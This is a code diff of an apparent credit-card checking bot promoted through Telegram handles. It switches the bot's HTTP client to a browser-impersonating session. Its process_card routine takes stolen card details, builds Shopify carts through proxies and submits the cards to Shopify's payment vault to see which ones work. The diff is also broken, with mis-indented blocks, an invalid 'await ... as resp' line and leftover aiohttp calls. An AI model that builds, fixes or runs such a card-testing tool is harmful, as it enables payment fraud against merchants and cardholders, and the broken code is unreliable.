@@ -1,9 +1,15 @@
+from curl_cffi.requests import AsyncSession
+from functools import wraps
+global_session = None
+async def get_session():
+    global global_session
+    if global_session is None: global_session = AsyncSession(impersonate='chrome110')
+    return global_session
 # 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/DEADLINEHERE5 
 # 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/PUNISHERHELPDESK
 # 𝐃𝐞𝐯: @DEADLINEHERE5
 
 import asyncio
-import aiohttp
 import json
 import re
 import random
@@ -145,15 +151,15 @@ async def make_graphql_request_with_captcha_handling(
     for attempt in range(max_retries + 1):
         try:
             response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
-            response_text = await response.text()
+            response_text = response.text
 
-            if response.status != 200:
+            if response.status_code != 200:
                 # If not a 200 status, it's likely an error page or non-JSON response
                 if attempt < max_retries:
                     await asyncio.sleep(2) # Wait longer for non-200 responses
                     continue
                 else:
-                    return None, f"HTTP Error {response.status}: {response_text}", False
+                    return None, f"HTTP Error {response.status_code}: {response_text}", False
 
             try:
                 # Attempt to parse JSON to catch invalid JSON responses
@@ -185,8 +191,8 @@ async def fetch_products(domain, proxy_str=None):
         
         proxy = parse_proxy(proxy_str) if proxy_str else None
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
+        session = await get_session() #(connector=connector, timeout=timeout) as session:
+            response = await session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                 if resp.status != 200:
                     return False, f"<b>Site Error! Status: {resp.status}</b>"
                 text = await resp.text()
@@ -316,7 +322,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         connector = aiohttp.TCPConnector(ssl=False)
         timeout = aiohttp.ClientTimeout(total=30)
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        session = await get_session() #(connector=connector, timeout=timeout) as session:
             url = ourl
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
@@ -356,7 +362,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
             
-            text = await response.text()
+            text = response.text
             if not sst:
                 sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                 if not sst:
@@ -715,7 +721,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             
             response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
             try:
-                token_data = await response.json()
+                token_data = response.json()
                 token = token_data.get('id')
                 if not token:
                     return False, 'Unable to get payment token', gateway, total_price, currency
